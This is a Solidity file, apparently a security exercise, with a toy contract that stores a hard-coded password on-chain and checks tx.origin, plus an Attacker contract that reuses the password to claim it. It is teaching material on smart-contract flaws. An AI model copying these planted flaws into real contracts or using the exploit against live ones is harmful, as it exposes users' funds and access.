// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract GuessMyPassword {
    bytes32 password = "I'Mz3p4SsW0rd";
    bool public claim;

    constructor() public {
        claim = false;
    }

    function guessMyPassword(bytes32 _password) public {
        require(tx.origin != msg.sender);
        require(_password == password, "Bad Password");
        claim = true;
    }
}

contract Attacker {
    GuessMyPassword original;
    bytes32 password = "I'Mz3p4SsW0rd";

    constructor(GuessMyPassword _address) public {
        original = _address;
    }

    function exploit() public {
        original.guessMyPassword(password);
    }
}
